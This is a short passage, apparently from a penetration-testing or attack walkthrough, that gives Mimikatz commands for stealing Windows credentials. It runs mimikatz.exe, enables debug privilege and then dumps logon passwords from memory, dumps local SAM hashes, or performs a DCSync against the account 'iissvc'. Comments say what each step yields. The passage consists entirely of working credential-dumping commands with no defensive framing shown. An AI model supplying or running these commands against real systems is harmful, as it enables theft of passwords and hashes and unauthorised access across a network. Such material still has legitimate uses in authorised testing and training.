cd C:\Tools
.\mimikatz.exe
```

**In Mimikatz:**
```
# Enable debug privileges
privilege::debug

# Dump all credentials from memory (if iissvc has logged in)
sekurlsa::logonpasswords

# OR dump from SAM (local accounts)
lsadump::sam

# OR dump from DCSync if you have domain admin (unlikely at this point)
lsadump::dcsync /user:iissvc